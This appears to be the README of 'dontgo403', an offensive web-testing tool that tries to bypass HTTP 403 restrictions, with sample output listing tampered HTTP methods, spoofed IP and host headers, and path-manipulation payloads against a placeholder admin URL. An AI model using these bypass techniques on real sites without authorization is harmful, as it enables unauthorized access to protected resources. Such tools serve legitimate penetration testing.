<p align="center">
<img src="https://i.imgur.com/0vLHCHd.png" width="600" height="100" >
</p>

[![contributions welcome](https://img.shields.io/badge/contributions-welcome-brightgreen.svg?style=flat)](https://github.com/dwyl/esta/issues)

dontgo403 is a tool to bypass 40X errors.

### Installation


### Options
```bash
./dontgo403 -h

Command line application that automates different attempts to bypass 40X codes

Usage:
  dontgo403 [flags]

Flags:
  -h, --help               help for dontgo403
  -p, --proxy string       Proxy URL. For example: http://127.0.0.1:8080
  -u, --uri string         Target URL
  -a, --useragent string   Set the User-Agent string (default 'dontgo403/0.1')
```

### Example of usage
```bash
./dontgo403 -u https://server.com/admin

[+] HTTP METHODS
TRACE: 405
CONNECT: 400
PUT: 405
POST: 405
OPTIONS: 405
DELETE: 405
HEAD: 200
GET: 403

[+] VERB TAMPERING
Forwarded localhost: 403
X-Forwarded-By localhost: 403
X-Forwarded-Server 127.0.0.1: 403
X-Real-IP 127.0.0.1: 403
X-Forwarded-Host 127.0.0.1: 403
X-Original-URL /admin: 403
X-Host localhost: 403
Forwarded 127.0.0.1: 403
True-Client-IP 127.0.0.1: 403
X-Override-URL /admin: 403
X-Forwarded 127.0.0.1: 403
X-HTTP-Host-Override 127.0.0.1: 403
X-Forwarded localhost: 403
X-Host 127.0.0.1: 403
X-Client-IP 127.0.0.1: 200 <---- 200, OK
Client-IP 127.0.0.1: 403
X-Forwarded-For 127.0.0.1: 403
X-Remote-Addr 127.0.0.1: 403
X-Forwarded-By 127.0.0.1: 403
Forwarded-For-Ip 127.0.0.1: 403
X-Forwarded-Host localhost: 403
X-Forwarded-For localhost: 403
Forwarded-For 127.0.0.1: 403
Referer /admin: 403
Forwarded-For localhost: 403
X-Forwarded-For-Original localhost: 403
X-Rewrite-URL /admin: 403
X-Remote-IP 127.0.0.1: 403
X-Forwarded-Server localhost: 403
X-Originating-IP 127.0.0.1: 403
X-HTTP-Method-Override PUT: 403
X-Forward 127.0.0.1: 403
X-Remote-Addr localhost: 403
X-Custom-IP-Authorization 127.0.0.1: 403
X-Forwarded-For-Original 127.0.0.1: 403
X-Forward localhost: 403
X-Forward-For 127.0.0.1: 403

[+] CUSTOM PATHS
End path ..\;/: 404
End path //: 403
End path : 403
End path ??: 403
End path : 403
End path ?: 403
End path /: 403
End path /.: 403
Mid path /.\;/: 404
Mid path \;foo=bar/: 403
Mid path /./: 403
Mid path /%2e/: 403
```

### Contact
[Twitter](https://www.twitter.com/devploit), [Telegram](https://t.me/devploit)